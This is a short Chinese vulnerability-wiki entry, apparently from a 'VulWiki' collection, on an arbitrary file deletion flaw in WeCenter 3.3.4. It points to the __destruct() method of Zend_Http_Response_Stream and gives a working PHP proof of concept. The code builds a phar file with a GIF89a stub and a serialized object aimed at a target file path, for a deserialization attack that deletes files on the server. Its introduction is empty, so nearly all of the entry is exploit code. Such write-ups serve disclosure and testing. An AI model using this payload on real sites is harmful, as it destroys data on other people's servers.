WeCenter 3.3.4 任意文件删除
===========================

一、漏洞简介
------------

二、漏洞影响
------------

WeCenter 3.3.4

三、复现过程
------------

### 任意文件删除

**system/Zend/Http/Response/Stream.php:\_\_destruct()**
方法中存在任意文件删除。

![](/Users/aresx/Documents/VulWiki/.resource/WeCenter3.3.4任意文件删除/media/rId25.png)

### poc

    <?php
    class Zend_Http_Response_Stream
    {
        protected $_cleanup;
        protected $stream_name;

        public function __construct($stream_name)
        {
            $this->_cleanup = true;
            $this->stream_name = $stream_name;
        }
    }

    $stream_name = '/var/www/html/wecenter334/shell.php';
    $evilobj = new Zend_Http_Response_Stream($stream_name);
    // phar.readonly无法通过该语句进行设置: init_set("phar.readonly",0);
    $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行
    file_exists($filename) ? unlink($filename) : null;
    $phar=new Phar($filename);
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($evilobj);
    $phar->addFromString("foo.txt","bar");
    $phar->stopBuffering();

    ?>
